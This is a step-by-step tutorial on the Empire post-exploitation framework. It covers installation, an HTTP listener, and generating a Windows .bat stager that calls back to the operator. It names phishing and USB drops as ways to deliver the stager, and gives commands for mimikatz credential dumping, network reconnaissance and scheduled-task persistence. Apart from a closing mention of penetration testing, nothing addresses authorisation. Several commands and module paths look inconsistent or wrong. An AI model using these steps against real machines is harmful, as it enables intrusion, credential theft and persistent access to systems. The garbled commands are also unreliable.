# Empire

Here's a detailed step-by-step tutorial on using **Empire**:

### Step 1: Install Empire

**Empire** is a popular tool, and installation requires setting up a few dependencies:

1. **System Requirements**:
   - Supported OS: Ubuntu, Debian, Kali Linux (recommended).
   - Ensure Python 3.8+ is installed.

2. **Install Dependencies**:
   ```bash
   sudo apt update
   sudo apt install -y git python3-pip python3-venv
   ```

3. **Clone the Empire Repository**:
   ```bash
   git clone https://github.com/BC-SECURITY/Empire.git
   cd Empire
   ```

4. **Set Up a Virtual Environment**:
   ```bash
   python3 -m venv empireenv
   source empireenv/bin/activate
   ```

5. **Install Empire**:
   ```bash
   pip install poetry
   poetry install
   poetry run server
   ```

6. **Start the Empire Server**:
   ```bash
   sudo ./empire
   ```
   This will start the server and drop you into the Empire CLI.

### Step 2: Configure Empire

1. **Access the CLI**:
   - After starting the Empire server, you can access the CLI by typing:
     ```bash
     ./empire client
     ```

2. **Set Up Listeners**:
   - Listeners are required to handle connections from the target systems.
   - Example using an HTTP listener:
     ```bash
     listeners
     uselistener http
     set Name http_listener
     set Host http://your_ip_address:port
     execute
     ```

3. **Create an Agent**:
   - Agents are used to interact with compromised machines.
   - Generate a payload to deploy an agent:
     ```bash
     usestager windows/launcher_bat
     set Listener http_listener
     generate
     ```
   - The above command generates a `.bat` file which can be executed on the target machine.

### Step 3: Deploying the Agent

1. **Transfer the Payload**:
   - Use various methods to deliver the payload to the target machine, such as phishing, USB drops, or exploiting vulnerabilities.

2. **Execute the Payload**:
   - Once the payload is on the target system, execute it to establish a connection with your Empire listener.

3. **Verify Connection**:
   - In the Empire CLI, you should see the agent checking in:
     ```bash
     agents
     ```

### Step 4: Post-Exploitation

1. **Interacting with the Agent**:
   - Select the agent:
     ```bash
     interact <agent_name>
     ```

2. **Run Commands**:
   - Use built-in modules to run various post-exploitation commands:
     ```bash
     usemodule privesc/mimikatz/logonpasswords
     execute
     ```
   - Other useful modules include:
     - **Discovery**: `usemodule situational_awareness/network/recon`
     - **Persistence**: `usemodule persistence/schtask`

3. **Manage Sessions**:
   - List active agents:
     ```bash
     agents
     ```
   - Kill a session:
     ```bash
     kill <agent_name>
     ```

### Step 5: Cleaning Up

1. **Remove Persistence**:
   - Ensure no backdoors are left behind using cleanup modules:
     ```bash
     usemodule management/cleanup
     execute
     ```

2. **Stop the Empire Server**:
   - To properly shut down Empire:
     ```bash
     exit
     ```

### Conclusion

Empire is a robust post-exploitation framework that supports Python-based agents and various modules to facilitate penetration testing activities. This guide covers the basics from installation to post-exploitation, but the real power of Empire comes from its flexible module system and the ability to customize operations based on the specific environment you're working in.
